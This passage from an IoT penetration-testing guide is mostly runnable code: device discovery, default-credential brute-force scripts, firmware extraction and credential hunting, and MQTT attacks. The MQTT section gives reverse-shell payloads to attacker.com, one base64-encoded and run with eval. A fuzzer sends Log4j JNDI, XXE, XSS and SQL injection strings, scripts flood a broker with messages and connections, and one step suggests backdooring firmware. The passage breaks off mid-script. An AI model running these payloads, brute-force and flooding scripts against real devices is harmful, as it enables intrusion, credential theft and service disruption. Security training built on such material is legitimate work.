# Install bluetooth tools
apt install bluez bluez-tools

# Scan for Bluetooth devices
hcitool scan

# Detailed scan
hcitool inq

# Get device info
hcitool info <MAC_ADDRESS>

# Service discovery
sdptool browse <MAC_ADDRESS>

# Using bluetoothctl
bluetoothctl
# Inside bluetoothctl:
power on
scan on
devices
info <MAC_ADDRESS>
```

**Zigbee Discovery**

```bash
# Using Killerbee (requires compatible hardware)
zbstumbler -c <channel>

# Zigbee network discovery
zbid -c <channel>

# Dump Zigbee traffic
zbdump -c <channel> -w capture.pcap
```

### IoT Device Fingerprinting

**Banner Grabbing IoT Services**

```bash
# HTTP banner grabbing
curl -I http://192.168.1.100

# Telnet banner
nc 192.168.1.100 23

# SSH banner
nc 192.168.1.100 22

# FTP banner
nc 192.168.1.100 21

# Custom port banner
nc 192.168.1.100 8080

# RTSP banner
curl -i rtsp://192.168.1.100:554

# Multiple services with timeout
timeout 2 bash -c "</dev/tcp/192.168.1.100/80" && echo "Port 80 open"
```

**Python IoT Fingerprinting Script**

```python
#!/usr/bin/env python3
import socket
import sys
import re

def banner_grab(ip, port, timeout=3):
    """Grab banner from service"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        
        # Send HTTP request for web services
        if port in [80, 8080, 8081, 443, 8443]:
            sock.send(b'GET / HTTP/1.0\r\n\r\n')
        
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        sock.close()
        return banner
    except:
        return None

def identify_device(ip, banner_data):
    """Identify IoT device from banner"""
    
    device_patterns = {
        'IP Camera': [r'IP Camera', r'DVR', r'NVR', r'webcam'],
        'Router': [r'router', r'gateway', r'DD-WRT', r'OpenWrt'],
        'Smart Home': [r'Philips Hue', r'Nest', r'Alexa', r'Home Assistant'],
        'Raspberry Pi': [r'Raspbian', r'Raspberry'],
        'Arduino': [r'Arduino'],
        'ESP8266/ESP32': [r'ESP8266', r'ESP32', r'NodeMCU'],
        'NAS': [r'Synology', r'QNAP', r'FreeNAS'],
        'Printer': [r'printer', r'HP ', r'Canon', r'Epson'],
    }
    
    identified = []
    
    for device_type, patterns in device_patterns.items():
        for pattern in patterns:
            if re.search(pattern, banner_data, re.IGNORECASE):
                identified.append(device_type)
                break
    
    return identified if identified else ['Unknown']

def scan_iot_device(ip):
    """Comprehensive IoT device scan"""
    
    common_ports = [21, 22, 23, 80, 443, 554, 1883, 5000, 8080, 8443, 8554, 9000]
    
    print(f"\n[+] Scanning {ip}")
    print("=" * 50)
    
    device_info = {'ip': ip, 'open_ports': [], 'services': {}}
    
    for port in common_ports:
        banner = banner_grab(ip, port)
        if banner:
            device_info['open_ports'].append(port)
            device_info['services'][port] = banner[:200]  # First 200 chars
            
            print(f"\n[+] Port {port} OPEN")
            print(f"Banner: {banner[:200]}")
            
            # Identify device
            device_types = identify_device(ip, banner)
            print(f"Possible device type: {', '.join(device_types)}")
    
    return device_info

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <ip_address>")
        sys.exit(1)
    
    scan_iot_device(sys.argv[1])
```

### Default Credential Testing

**Common IoT Default Credentials**

```bash
# Create credential list
cat > iot_creds.txt << 'EOF'
admin:admin
admin:password
admin:12345
admin:
root:root
root:admin
root:password
root:12345
root:
user:user
admin:Admin
support:support
EOF

# HTTP Basic Auth testing
hydra -C iot_creds.txt http-get://192.168.1.100

# SSH brute force
hydra -C iot_creds.txt ssh://192.168.1.100

# Telnet brute force
hydra -C iot_creds.txt telnet://192.168.1.100

# FTP brute force
hydra -C iot_creds.txt ftp://192.168.1.100
```

**Automated Default Credential Scanner**

```bash
#!/bin/bash
# iot_default_creds.sh

TARGET="$1"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

# Common credentials
CREDS=(
    "admin:admin"
    "admin:password"
    "admin:12345"
    "root:root"
    "root:password"
    "admin:"
    "root:"
)

echo "[+] Testing HTTP Basic Auth"
for cred in "${CREDS[@]}"; do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    
    response=$(curl -s -u "$user:$pass" "http://$TARGET" -w "%{http_code}" -o /dev/null)
    
    if [ "$response" == "200" ]; then
        echo "[!] FOUND: $user:$pass (HTTP 200)"
    fi
done

echo "[+] Testing SSH"
for cred in "${CREDS[@]}"; do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    
    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$user@$TARGET" "echo success" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "[!] FOUND: $user:$pass (SSH)"
    fi
done

echo "[+] Scan complete"
```

## Firmware Analysis

Firmware analysis involves extracting, examining, and reverse-engineering embedded device firmware to identify vulnerabilities, hardcoded credentials, and security misconfigurations.

### Firmware Acquisition

**Downloading Firmware**

```bash
# From manufacturer website
wget http://manufacturer.com/firmware/device_v1.0.bin

# From device via HTTP
curl http://192.168.1.100/firmware.bin -o firmware.bin

# Via FTP
wget ftp://192.168.1.100/firmware.bin

# From update server (captured via proxy)
# Intercept with Burp Suite or mitmproxy
```

**Extracting from Device**

```bash
# SCP from device
scp admin@192.168.1.100:/dev/mtd0 firmware.bin

# Via serial connection
screen /dev/ttyUSB0 115200
# Inside device shell:
dd if=/dev/mtd0 of=/tmp/firmware.bin
# Transfer via netcat

# TFTP extraction
tftp 192.168.1.100
get firmware.bin
```

**Physical Extraction (UART/JTAG)**

**[Inference]** Physical firmware extraction requires hardware tools and direct device access.

```bash
# UART connection
# Identify UART pins: GND, TX, RX, VCC
# Connect USB-to-Serial adapter

# Determine baud rate
baudrate.py -p /dev/ttyUSB0

# Connect with screen
screen /dev/ttyUSB0 115200

# Connect with minicom
minicom -D /dev/ttyUSB0 -b 115200

# Connect with picocom
picocom -b 115200 /dev/ttyUSB0
```

### Firmware Analysis Tools

**binwalk (Firmware Analysis Tool)**

```bash
# Install binwalk
apt install binwalk

# Basic analysis
binwalk firmware.bin

# Extract filesystems
binwalk -e firmware.bin

# Extract with matryoshka (recursive)
binwalk -Me firmware.bin

# Signature scan
binwalk -B firmware.bin

# Entropy analysis (detect encryption)
binwalk -E firmware.bin

# Generate entropy graph
binwalk -E -J firmware.bin

# Raw extraction
binwalk -D 'filesystem' firmware.bin

# Extract specific types
binwalk --dd='.*' firmware.bin
```

**Binwalk Output Analysis**

```bash
# Example output:
# DECIMAL       HEXADECIMAL     DESCRIPTION
# ------------------------------------------------------------------------
# 0             0x0             uImage header
# 64            0x40            LZMA compressed data
# 12345         0x3039          Squashfs filesystem

# After extraction, examine the filesystem
cd _firmware.bin.extracted
ls -la
```

**firmware-mod-kit**

```bash
# Install firmware-mod-kit
git clone https://github.com/rampageX/firmware-mod-kit.git
cd firmware-mod-kit/src
./configure && make

# Extract firmware
./extract-firmware.sh firmware.bin

# Extracted files will be in 'fmk' directory
cd fmk/rootfs

# Modify firmware (e.g., backdoor)
# ... make changes ...

# Rebuild firmware
cd ../..
./build-firmware.sh firmware.bin
```

**sasquatch (Squashfs Extractor)**

```bash
# Install sasquatch (supports various Squashfs versions)
git clone https://github.com/devttys0/sasquatch
cd sasquatch
./build.sh

# Extract Squashfs
./sasquatch firmware.bin

# Alternative with unsquashfs
unsquashfs firmware.bin
```

**jefferson (JFFS2 Extractor)**

```bash
# Install jefferson
pip install jefferson

# Extract JFFS2 filesystem
jefferson firmware.bin -d output_dir

# Manual extraction
mkdir jffs2_root
mount -t jffs2 firmware.bin jffs2_root
```

### Firmware Content Analysis

**File System Enumeration**

```bash
# After extraction, explore filesystem
cd _firmware.extracted/squashfs-root

# Find interesting files
find . -name "*.conf"
find . -name "*.cfg"
find . -name "*.xml"
find . -name "*.ini"
find . -name "*.db"
find . -name "*pass*"
find . -name "*key*"
find . -name "*secret*"

# Find SUID binaries
find . -perm -4000

# Find world-writable files
find . -perm -002 -type f

# Find executables
find . -type f -executable
```

**Credential Extraction**

```bash
# Search for passwords
grep -r "password" .
grep -r "passwd" .
grep -ri "pwd" .

# Search for usernames
grep -r "username" .
grep -r "user=" .

# Search for API keys
grep -r "api_key" .
grep -r "apikey" .
grep -r "api-key" .

# Search for tokens
grep -r "token" .
grep -r "secret" .

# Search for private keys
grep -r "BEGIN RSA PRIVATE KEY" .
grep -r "BEGIN PRIVATE KEY" .

# Search for certificates
find . -name "*.pem"
find . -name "*.key"
find . -name "*.crt"

# Search for hardcoded IPs
grep -roE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' .

# Search for emails
grep -roE '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b' .

# Search for URLs
grep -roE 'https?://[^\s]+' .
```

**Python Credential Extraction Script**

```python
#!/usr/bin/env python3
import os
import re
import sys

def search_credentials(directory):
    """Search for credentials in firmware files"""
    
    patterns = {
        'Password': [
            r'password\s*=\s*["\']([^"\']+)["\']',
            r'passwd\s*=\s*["\']([^"\']+)["\']',
            r'pwd\s*:\s*["\']([^"\']+)["\']',
        ],
        'Username': [
            r'username\s*=\s*["\']([^"\']+)["\']',
            r'user\s*=\s*["\']([^"\']+)["\']',
        ],
        'API Key': [
            r'api[_-]?key\s*=\s*["\']([^"\']+)["\']',
            r'apikey\s*=\s*["\']([^"\']+)["\']',
        ],
        'Private Key': [
            r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
        ],
        'URL': [
            r'https?://[^\s<>"\']+',
        ],
    }
    
    findings = {key: [] for key in patterns.keys()}
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            
            # Skip binary files
            try:
                with open(filepath, 'r', errors='ignore') as f:
                    content = f.read()
                
                for category, pattern_list in patterns.items():
                    for pattern in pattern_list:
                        matches = re.finditer(pattern, content, re.IGNORECASE)
                        for match in matches:
                            finding = {
                                'file': filepath,
                                'match': match.group(0),
                                'line': content[:match.start()].count('\n') + 1
                            }
                            if finding not in findings[category]:
                                findings[category].append(finding)
            except:
                pass
    
    return findings

def print_findings(findings):
    """Print formatted findings"""
    
    for category, items in findings.items():
        if items:
            print(f"\n[+] {category} Found:")
            print("=" * 60)
            for item in items:
                print(f"File: {item['file']}")
                print(f"Line: {item['line']}")
                print(f"Match: {item['match'][:100]}")
                print("-" * 60)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <firmware_directory>")
        sys.exit(1)
    
    print("[*] Searching for credentials...")
    findings = search_credentials(sys.argv[1])
    print_findings(findings)
```

**Configuration File Analysis**

```bash
# Common configuration locations
cat etc/config/*
cat etc/*.conf
cat etc/shadow
cat etc/passwd

# Web server configs
cat etc/nginx/nginx.conf
cat etc/apache2/apache2.conf
cat etc/lighttpd/lighttpd.conf

# Application configs
cat opt/*/config/*
cat usr/local/*/config/*

# Database configs
find . -name "*.db"
sqlite3 config.db ".tables"
sqlite3 config.db "SELECT * FROM users;"
```

### Binary Analysis

**strings Command**

```bash
# Extract strings from binary
strings binary_file

# Minimum string length
strings -n 8 binary_file

# Search for specific strings
strings binary_file | grep -i "password"
strings binary_file | grep -i "http://"

# Extract URLs
strings binary_file | grep -oE 'https?://[^\s]+'

# Extract IP addresses
strings binary_file | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b'

# Save strings to file
strings binary_file > strings_output.txt
```

**file Command Analysis**

```bash
# Identify file types
file *
file -b binary_file

# Detailed file info
file -i binary_file

# Check if stripped
file binary_file | grep -i "stripped"
```

**Ghidra (Reverse Engineering)**

```bash
# Install Ghidra
# Download from https://ghidra-sre.org/

# Run Ghidra
ghidraRun

# Create new project
# Import binary
# Analyze binary
# Look for:
# - Main function
# - Authentication functions
# - Network functions
# - Hardcoded strings
```

**radare2**

```bash
# Install radare2
apt install radare2

# Open binary
r2 binary_file

# Analyze binary
aa
aaa  # Deep analysis

# List functions
afl

# Disassemble main
pdf @main

# Search for strings
iz

# Search for specific string
iz~password

# Find cross-references
axt @ sym.authenticate

# Exit
q
```

**Binary Exploitation Check**

```bash
# Check security features
checksec binary_file

# Detailed security analysis
rabin2 -I binary_file

# Check for stack canaries
readelf -s binary_file | grep __stack_chk_fail

# Check for PIE
readelf -h binary_file | grep Type

# Check for NX (DEP)
readelf -l binary_file | grep GNU_STACK

# Check for RELRO
readelf -l binary_file | grep GNU_RELRO
```

### Emulation and Dynamic Analysis

**QEMU User Mode Emulation**

```bash
# Install QEMU
apt install qemu-user qemu-user-static

# Emulate ARM binary
qemu-arm -L ./firmware_root/ ./binary_file

# Emulate MIPS binary
qemu-mips -L ./firmware_root/ ./binary_file

# With debugging
qemu-arm -g 1234 -L ./firmware_root/ ./binary_file

# Connect with GDB
gdb-multiarch
target remote :1234
```

**Firmware Analysis Toolkit (FAT)**

```bash
# Install FAT
git clone https://github.com/attify/firmware-analysis-toolkit.git
cd firmware-analysis-toolkit
./setup.sh

# Extract and emulate firmware
./fat.py firmware.bin

# This will:
# 1. Extract filesystem
# 2. Identify architecture
# 3. Setup QEMU emulation
# 4. Start network services
```

**firmadyne (Automated Firmware Emulation)**

```bash
# Install firmadyne
git clone --recursive https://github.com/firmadyne/firmadyne.git
cd firmadyne
./download.sh

# Setup database
sudo -u postgres createuser -P firmadyne
sudo -u postgres createdb -O firmadyne firmware

# Extract firmware
./sources/extractor/extractor.py -b brand -sql 127.0.0.1 -np firmware.bin images

# Identify architecture
./scripts/getArch.sh ./images/1.tar.gz

# Setup network
./scripts/inferNetwork.sh 1

# Emulate
./scratch/1/run.sh
```

### Vulnerability Identification

**Automated Vulnerability Scanning**

```bash
# Using cwe_checker (static analysis)
git clone https://github.com/fkie-cad/cwe_checker.git
cd cwe_checker
cargo build --release

./target/release/cwe_checker binary_file

# Using semgrep for source code
pip install semgrep
semgrep --config=auto firmware_source/
```

**Manual Vulnerability Assessment Checklist**

```bash
# Check for:
# 1. Hardcoded credentials
grep -ri "password\|admin\|root" .

# 2. Command injection vectors
grep -r "system(" .
grep -r "popen(" .
grep -r "exec(" .

# 3. Buffer overflows
grep -r "strcpy\|strcat\|sprintf\|gets" .

# 4. Insecure functions
grep -r "strcpy\|sprintf\|gets\|scanf" .

# 5. SQL injection
grep -r "SELECT\|INSERT\|UPDATE\|DELETE" . | grep -v ".sql:"

# 6. Path traversal
grep -r "../" .
grep -r "fopen\|open(" .

# 7. Weak crypto
grep -ri "des\|md5\|sha1\|rc4" .

# 8. Backdoors
grep -r "backdoor\|debug\|test" .
find . -name "*backdoor*" -o -name "*debug*"
```

## MQTT Enumeration

MQTT (Message Queuing Telemetry Transport) is a lightweight pub/sub messaging protocol commonly used in IoT environments.

### MQTT Basics

**MQTT Architecture**

```
Publisher --> MQTT Broker --> Subscriber
              (Topics)

Common ports:
- 1883: MQTT (unencrypted)
- 8883: MQTT over TLS
```

**[Inference]** MQTT uses a topic-based publish/subscribe model where clients can publish messages to topics or subscribe to receive messages from topics.

### MQTT Discovery

**Nmap MQTT Detection**

```bash
# Basic MQTT detection
nmap -p 1883,8883 192.168.1.0/24

# With MQTT script
nmap -p 1883 --script mqtt-subscribe 192.168.1.0/24

# Detailed service detection
nmap -sV -p 1883,8883 --script mqtt-subscribe 192.168.1.0/24
```

**Shodan MQTT Search**

```bash
# Search for MQTT brokers
shodan search "port:1883"
shodan search "port:1883 product:mosquitto"
shodan search "port:8883 mqtt"

# Search by organization
shodan search "port:1883 org:\"Company Name\""

# Download results
shodan download mqtt_results.json.gz "port:1883"
```

### MQTT Client Tools

**mosquitto_sub (Subscribe to Topics)**

```bash
# Install Mosquitto clients
apt install mosquitto-clients

# Subscribe to all topics
mosquitto_sub -h 192.168.1.100 -t '#' -v

# Parameters:
# -h: Host
# -t: Topic (# = wildcard for all topics)
# -v: Verbose (show topic names)

# Subscribe to specific topic
mosquitto_sub -h 192.168.1.100 -t 'home/temperature'

# With authentication
mosquitto_sub -h 192.168.1.100 -t '#' -u username -P password

# MQTT over TLS
mosquitto_sub -h 192.168.1.100 -p 8883 -t '#' --cafile ca.crt

# With client certificate
mosquitto_sub -h 192.168.1.100 -p 8883 -t '#' \
  --cafile ca.crt --cert client.crt --key client.key

# Subscribe with QoS
mosquitto_sub -h 192.168.1.100 -t '#' -q 2

# Parameters:
# -q: QoS level (0, 1, or 2)
# 0 = At most once
# 1 = At least once
# 2 = Exactly once

# Save messages to file
mosquitto_sub -h 192.168.1.100 -t '#' -v > mqtt_messages.txt

# Subscribe with clean session
mosquitto_sub -h 192.168.1.100 -t '#' -c

# Subscribe with client ID
mosquitto_sub -h 192.168.1.100 -t '#' -i "custom_client_id"

# Multiple topic subscriptions
mosquitto_sub -h 192.168.1.100 -t 'home/+/temperature' -t 'sensors/#'
```

**mosquitto_pub (Publish to Topics)**

```bash
# Publish message
mosquitto_pub -h 192.168.1.100 -t 'home/lights' -m 'ON'

# Publish with authentication
mosquitto_pub -h 192.168.1.100 -t 'home/lights' -m 'ON' -u username -P password

# Publish from file
mosquitto_pub -h 192.168.1.100 -t 'home/data' -f data.txt

# Publish with retain flag (message persists)
mosquitto_pub -h 192.168.1.100 -t 'home/status' -m 'online' -r

# Publish with QoS
mosquitto_pub -h 192.168.1.100 -t 'home/critical' -m 'alert' -q 2

# Publish stdin input
echo "test message" | mosquitto_pub -h 192.168.1.100 -t 'home/test' -l

# Publish NULL message (clear retained message)
mosquitto_pub -h 192.168.1.100 -t 'home/status' -n -r
```

**MQTT Topic Wildcards**

```bash
# Single-level wildcard (+)
mosquitto_sub -h 192.168.1.100 -t 'home/+/temperature'
# Matches: home/bedroom/temperature, home/kitchen/temperature
# Does NOT match: home/bedroom/sensor/temperature

# Multi-level wildcard (#)
mosquitto_sub -h 192.168.1.100 -t 'home/#'
# Matches: home/bedroom/temperature, home/kitchen/light, home/bedroom/sensor/humidity

# Combination
mosquitto_sub -h 192.168.1.100 -t 'sensors/+/data/#'
```

### MQTT Enumeration Scripts

**Python MQTT Subscriber (paho-mqtt)**

```python
#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import sys
import time
import json

class MQTTMonitor:
    def __init__(self, broker, port=1883, username=None, password=None):
        self.broker = broker
        self.port = port
        self.username = username
        self.password = password
        self.topics = {}
        
        self.client = mqtt.Client()
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        
        if username and password:
            self.client.username_pw_set(username, password)
    
    def on_connect(self, client, userdata, flags, rc):
        """Callback when connected to broker"""
        if rc == 0:
            print(f"[+] Connected to {self.broker}:{self.port}")
            print("[*] Subscribing to all topics (#)")
            client.subscribe('#', qos=2)
        else:
            print(f"[-] Connection failed with code {rc}")
    
    def on_message(self, client, userdata, msg):
        """Callback when message received"""
        topic = msg.topic
        payload = msg.payload.decode('utf-8', errors='ignore')
        
        # Track unique topics
        if topic not in self.topics:
            self.topics[topic] = []
            print(f"\n[+] New Topic Discovered: {topic}")
        
        # Store message
        message_data = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'payload': payload,
            'qos': msg.qos,
            'retain': msg.retain
        }
        self.topics[topic].append(message_data)
        
        # Display message
        print(f"\nTopic: {topic}")
        print(f"Payload: {payload}")
        print(f"QoS: {msg.qos}, Retained: {msg.retain}")
        
        # Try to parse as JSON
        try:
            json_data = json.loads(payload)
            print(f"JSON: {json.dumps(json_data, indent=2)}")
        except:
            pass
    
    def connect(self):
        """Connect to broker and start monitoring"""
        try:
            self.client.connect(self.broker, self.port, 60)
            print(f"[*] Monitoring MQTT traffic on {self.broker}:{self.port}")
            print("[*] Press Ctrl+C to stop\n")
            self.client.loop_forever()
        except KeyboardInterrupt:
            print("\n\n[*] Stopping monitor...")
            self.save_results()
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def save_results(self):
        """Save discovered topics and messages"""
        output_file = f"mqtt_enum_{self.broker}_{int(time.time())}.json"
        
        with open(output_file, 'w') as f:
            json.dump(self.topics, f, indent=2)
        
        print(f"[+] Results saved to {output_file}")
        print(f"[+] Total topics discovered: {len(self.topics)}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <broker_ip> [port] [username] [password]")
        sys.exit(1)
    
    broker = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
    username = sys.argv[3] if len(sys.argv) > 3 else None
    password = sys.argv[4] if len(sys.argv) > 4 else None
    
    monitor = MQTTMonitor(broker, port, username, password)
    monitor.connect()
```

**MQTT Fuzzing Script**

```python
#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import sys
import time

def mqtt_fuzzer(broker, port=1883):
    """Fuzz MQTT broker with various payloads"""
    
    client = mqtt.Client()
    
    try:
        client.connect(broker, port, 60)
        print(f"[+] Connected to {broker}:{port}")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return
    
    # Common topics to test
    test_topics = [
        '$SYS/#',
        'test',
        'home/+/command',
        'admin',
        'system',
        '../../../etc/passwd',
        'system/admin',
        'device/control',
    ]
    
    # Payloads to test
    payloads = [
        'test',
        '{"cmd":"reboot"}',
        '{"admin":true}',
        'A' * 1000,  # Buffer overflow attempt
        '${jndi:ldap://attacker.com/a}',  # Log4j
        '<script>alert(1)</script>',  # XSS
        "'; DROP TABLE users;--",  # SQL injection
        '../../../etc/passwd',  # Path traversal
        '\x00' * 100,  # Null bytes
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    ]
    
    print("[*] Starting fuzzing...")
    
    for topic in test_topics:
        print(f"\n[*] Testing topic: {topic}")
        
        for payload in payloads:
            try:
                client.publish(topic, payload)
                print(f"  [+] Sent: {payload[:50]}...")
                time.sleep(0.1)
            except Exception as e:
                print(f"  [-] Error with payload: {e}")
    
    client.disconnect()
    print("\n[+] Fuzzing complete")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <broker_ip> [port]")
        sys.exit(1)
    
    broker = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
    
    mqtt_fuzzer(broker, port)
```

### MQTT Security Testing

**Anonymous Access Testing**

```bash
# Test anonymous subscription
mosquitto_sub -h 192.168.1.100 -t '#' -v

# If successful, broker allows anonymous access
# Try to subscribe to system topics
mosquitto_sub -h 192.168.1.100 -t '$SYS/#' -v

# System topics provide broker information:
# $SYS/broker/version
# $SYS/broker/clients/connected
# $SYS/broker/messages/received
# $SYS/broker/uptime
```

**Authentication Testing**

```bash
# Test default credentials
mosquitto_sub -h 192.168.1.100 -t '#' -u admin -P admin
mosquitto_sub -h 192.168.1.100 -t '#' -u admin -P password
mosquitto_sub -h 192.168.1.100 -t '#' -u mqtt -P mqtt
mosquitto_sub -h 192.168.1.100 -t '#' -u user -P user

# Brute force with hydra
hydra -L users.txt -P passwords.txt 192.168.1.100 mqtt

# Create credential lists
cat > mqtt_users.txt << EOF
admin
mqtt
user
broker
guest
EOF

cat > mqtt_passwords.txt << EOF
admin
password
mqtt
12345
guest
EOF
```

**ACL (Access Control List) Testing**

```bash
# Test topic permissions

# Try to subscribe to admin topics
mosquitto_sub -h 192.168.1.100 -t 'admin/#' -u user -P password

# Try to publish to restricted topics
mosquitto_pub -h 192.168.1.100 -t 'system/command' -m 'test' -u user -P password

# Test wildcard restrictions
mosquitto_sub -h 192.168.1.100 -t '#' -u user -P password
mosquitto_sub -h 192.168.1.100 -t '+/#' -u user -P password
```

**$SYS Topic Enumeration**

```bash
# Subscribe to system topics
mosquitto_sub -h 192.168.1.100 -t '$SYS/#' -v

# Information disclosed:
# - Broker version
# - Connected clients
# - Message statistics
# - Network statistics
# - Subscription information
# - Uptime

# Specific system topics
mosquitto_sub -h 192.168.1.100 -t '$SYS/broker/version' -v
mosquitto_sub -h 192.168.1.100 -t '$SYS/broker/clients/connected' -v
mosquitto_sub -h 192.168.1.100 -t '$SYS/broker/clients/total' -v
mosquitto_sub -h 192.168.1.100 -t '$SYS/broker/load/#' -v
```

**Python $SYS Enumeration Script**

```python
#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import sys
import time

def enumerate_sys_topics(broker, port=1883, username=None, password=None):
    """Enumerate $SYS topics for information gathering"""
    
    sys_info = {}
    
    def on_connect(client, userdata, flags, rc):
        if rc == 0:
            print(f"[+] Connected to broker")
            client.subscribe('$SYS/#')
        else:
            print(f"[-] Connection failed: {rc}")
    
    def on_message(client, userdata, msg):
        topic = msg.topic
        payload = msg.payload.decode('utf-8', errors='ignore')
        sys_info[topic] = payload
        print(f"{topic}: {payload}")
    
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    
    if username and password:
        client.username_pw_set(username, password)
    
    try:
        client.connect(broker, port, 60)
        client.loop_start()
        
        # Wait for messages
        print("[*] Enumerating $SYS topics...\n")
        time.sleep(10)
        
        client.loop_stop()
        client.disconnect()
        
        # Print summary
        print("\n" + "="*60)
        print("SUMMARY")
        print("="*60)
        
        if '$SYS/broker/version' in sys_info:
            print(f"Broker Version: {sys_info['$SYS/broker/version']}")
        
        if '$SYS/broker/clients/connected' in sys_info:
            print(f"Connected Clients: {sys_info['$SYS/broker/clients/connected']}")
        
        if '$SYS/broker/uptime' in sys_info:
            print(f"Uptime: {sys_info['$SYS/broker/uptime']}")
        
        print(f"\nTotal $SYS topics discovered: {len(sys_info)}")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <broker_ip> [port] [username] [password]")
        sys.exit(1)
    
    broker = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
    username = sys.argv[3] if len(sys.argv) > 3 else None
    password = sys.argv[4] if len(sys.argv) > 4 else None
    
    enumerate_sys_topics(broker, port, username, password)
```

### MQTT Injection Attacks

**Command Injection via MQTT**

```bash
# If device executes MQTT messages as commands

# Test basic command injection
mosquitto_pub -h 192.168.1.100 -t 'device/command' -m 'reboot'

# Command chaining
mosquitto_pub -h 192.168.1.100 -t 'device/command' -m 'status; cat /etc/passwd'

# Reverse shell payload
mosquitto_pub -h 192.168.1.100 -t 'device/command' -m 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Encoded payload
payload=$(echo 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' | base64)
mosquitto_pub -h 192.168.1.100 -t 'device/command' -m "eval \$(echo $payload | base64 -d)"
```

**JSON Injection**

```bash
# If device parses JSON from MQTT

# Normal message
mosquitto_pub -h 192.168.1.100 -t 'device/config' -m '{"brightness":50}'

# Injection attempt
mosquitto_pub -h 192.168.1.100 -t 'device/config' -m '{"brightness":50,"admin":true}'

# Privilege escalation
mosquitto_pub -h 192.168.1.100 -t 'device/config' -m '{"user":"guest","role":"admin"}'

# Command in JSON
mosquitto_pub -h 192.168.1.100 -t 'device/config' -m '{"cmd":"reboot","exec":true}'
```

**Path Traversal via Topics**

```bash
# Attempt to access files via topic names
mosquitto_pub -h 192.168.1.100 -t '../../../etc/passwd' -m 'test'
mosquitto_pub -h 192.168.1.100 -t 'logs/../../sensitive_data' -m 'test'

# Subscribe to potential file paths
mosquitto_sub -h 192.168.1.100 -t 'files/../../../etc/passwd'
```

### MQTT Traffic Interception

**Wireshark MQTT Capture**

```bash
# Capture MQTT traffic
wireshark -i eth0 -k -f "tcp port 1883"

# Display filter for MQTT
mqtt

# Filter for specific message types
mqtt.msgtype == 3    # PUBLISH
mqtt.msgtype == 8    # SUBSCRIBE
mqtt.msgtype == 1    # CONNECT

# Filter for specific topics
mqtt.topic contains "admin"
```

**tcpdump MQTT Capture**

```bash
# Capture MQTT traffic
tcpdump -i eth0 -n port 1883 -w mqtt_capture.pcap

# Capture with ASCII output
tcpdump -i eth0 -n port 1883 -A

# Filter specific host
tcpdump -i eth0 -n host 192.168.1.100 and port 1883
```

**mitmproxy for MQTT**

```bash
# Install mitmproxy
pip install mitmproxy

# For MQTT over WebSockets
mitmproxy --mode transparent --showhost

# Intercept and modify MQTT messages
# Custom addon script can parse MQTT protocol
```

### MQTT-specific Vulnerabilities

**Mosquitto CVE Testing**

**[Unverified]** Specific CVE exploits depend on broker version and configuration.

```bash
# Identify Mosquitto version
nmap -sV -p 1883 192.168.1.100

# Known vulnerabilities:
# CVE-2017-7650 - Pattern ACL bypass
# CVE-2018-12551 - Malformed PUBLISH packet DoS
# CVE-2019-11779 - Stack overflow

# Test CVE-2017-7650 (ACL bypass)
# Subscribe to restricted topic using pattern bypass
mosquitto_sub -h 192.168.1.100 -t 'restricted/topic' -u user -P password
```

**Denial of Service Testing**

```bash
# Subscribe bomb (multiple connections)
for i in {1..1000}; do
    mosquitto_sub -h 192.168.1.100 -t '#' -i "client_$i" &
done

# Publish flood
for i in {1..10000}; do
    mosquitto_pub -h 192.168.1.100 -t 'test' -m "data_$i"
done

# Large message payload
dd if=/dev/urandom bs=1M count=10 | mosquitto_pub -h 192.168.1.100 -t 'test' -l

# Malformed packets (requires custom script)
```

**Python DoS Script**

```python
#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import threading
import sys

def flood_publish(broker, port, topic, count):
    """Flood broker with publish messages"""
    
    client = mqtt.Client()
    
    try:
        client.connect(broker, port, 60)
        
        for i in range(count):
            payload = f"flood_message_{i}" * 100  # Large payload
            client.publish(topic, payload, qos=2)
            
            if i % 100 == 0:
                print(f"[*] Sent {i} messages")
        
        client.disconnect()
        
    except Exception as e:
        print(f"[-] Error: {e}")

def connection_flood(broker, port, num_clients):
    """Flood broker with connections"""
    
    def connect_client(client_id):
        try:
            client = mqtt.Client(client_id=f"flood_{client_id}")
            client.connect(broker, port, 60)
            client.subscribe('#')
            client.loop_forever()
        except:
            pass
    
